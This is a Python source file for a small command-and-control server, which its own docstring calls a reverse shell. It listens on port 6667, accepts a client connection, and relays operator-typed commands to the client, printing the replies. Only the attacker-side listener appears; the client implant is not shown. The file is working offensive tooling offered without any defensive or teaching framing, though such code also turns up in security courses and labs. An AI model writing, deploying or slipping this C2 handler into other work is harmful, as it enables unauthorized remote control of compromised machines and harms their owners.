from time import sleep
import socket
import sys


class Server(object):
    """
    A simple command and control server(Reverse Shell).
    """
    def __init__(self, host="", port=6667, recv_size=1024, listen=10):
        self.host = host
        self.port = port
        self.recv_size = recv_size
        self.listen = listen
        self.connection, self.address = False, False

        # Create the socket
        try:
            self.s = socket.socket()
        except socket.error as error_message:
            print('Could not create socket:', error_message)
            sys.exit()

        # Bind the socket
        self._bind_the_socket()
        self._accept_connections()

    def _bind_the_socket(self, attempts=1):
        """
        Bind the socket to the port.

        :return:
        """

        print('Bind the socket to port', self.port)
        try:
            self.s.bind((self.host, self.port))
            self.s.listen(self.listen)
            print('Waiting for client connections...')
        except socket.error as error_message:
            print('Could not bind the socket:', error_message, '\n', 'Trying again...')
            sleep(1)
            if attempts == 5:
                print('Could not bind the socket to the port after 5 tries.  Aborting...')
                sys.exit()
            self._bind_the_socket(attempts=attempts + 1)

    def _accept_connections(self):
        """
        Start accepting connections.

        :return:
        """

        self.connection, self.address = self.s.accept()
        print('Connection | IP', self.address[0], '| Port', self.address[1])
        print('> ', end='')
        self._send_commands()
        self.connection.close()

    def _send_commands(self):
        """
        Send commands through to the clients.

        :return:
        """

        while True:
            command = input()
            response = '> '
            accepting = True
            if self._check_command(command):
                self.connection.send(str.encode(command))
                while accepting:
                    response = str(self.connection.recv(self.recv_size), 'utf-8')
                    print(response, end='')
                    if len(response) < self.recv_size:
                        accepting = False
            else:
                print(response, end='')

    def _check_command(self, command):
        """
        Check the command and return True or False, or quit if the quit command is sent.

        :param command:
        :return:
        """

        if not self.connection:
            raise ConnectionError('Connection to client failed[1].')

        if command == 'quit' or command == 'exit':
            # Send the quit command to the client, which will make the client
            # close the current connection, and attempt to connect to the
            # server indefinitely.
            self.connection.send(str.encode('quit'))

            # Close the server's connection down.
            self.connection.close()
            self.s.close()
            sys.exit()

        if len(str.encode(command)) > 0:
            return True
        return False


if __name__ == '__main__':

    the_host = ''
    the_port = 6667
    the_recv_size = 1024
    the_listen = 10

    def check_cli_arg(arg):
        global the_host
        global the_port
        global the_recv_size
        global the_listen

        if 'host=' in arg:
            the_host = arg.split('=')[1]
        elif 'port=' in arg:
            the_port = int(arg.split('=')[1])
        elif 'recv_size=' in arg:
            the_recv_size = int(arg.split('=')[1])
        elif 'listen=' in arg:
            the_listen = int(arg.split('=')[1])

    for argument in sys.argv[1:]:
        check_cli_arg(argument)

    server = Server(
        host=the_host,
        port=the_port,
        recv_size=the_recv_size,
        listen=the_listen
    )
